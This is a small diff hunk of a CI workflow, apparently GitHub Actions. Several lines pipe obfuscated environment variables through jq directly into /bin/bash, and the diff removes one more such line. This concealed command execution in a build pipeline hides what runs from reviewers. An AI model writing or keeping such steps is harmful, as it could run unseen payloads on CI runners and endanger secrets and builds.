@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$tuyt1872" | jq -r .z834 | /bin/bash
           printf '%s' "$za8" | jq -r .lhzgu6631 | /bin/bash
           echo $ssvvy709 | jq -r .wttt37254 | /bin/bash
-          printf '%s' "$jipb3" | jq -r .hetx7 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
